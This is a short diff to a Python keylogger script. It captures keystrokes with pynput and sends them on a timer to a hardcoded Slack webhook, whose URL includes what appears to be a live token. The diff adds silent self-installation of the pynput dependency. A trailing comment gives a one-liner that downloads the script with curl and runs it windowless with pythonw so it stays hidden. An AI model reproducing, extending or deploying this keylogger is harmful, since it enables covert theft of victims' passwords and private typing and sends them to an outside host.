@@ -1,8 +1,20 @@
-from pynput.keyboard import Listener
 from threading import Timer
 import requests
 import json
 import platform
+import pip
+
+
+def import_or_install(package):
+    try:
+        __import__(package)
+    except ImportError:
+        pip.main(['install', package])
+
+
+import_or_install('pynput')
+
+from pynput.keyboard import Listener
 
 WEBHOOK = 'https://hooks.slack.com/services/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'
 
@@ -51,3 +63,4 @@ class Keylogger:
 if __name__ == '__main__':
     Keylogger(WEBHOOK, TIME_INTERVAL).run()
 # Key.(?!backspace\b)\b\w+
+# curl -o logger.pyw URL; pip install pynput; pythonw logger.pyw
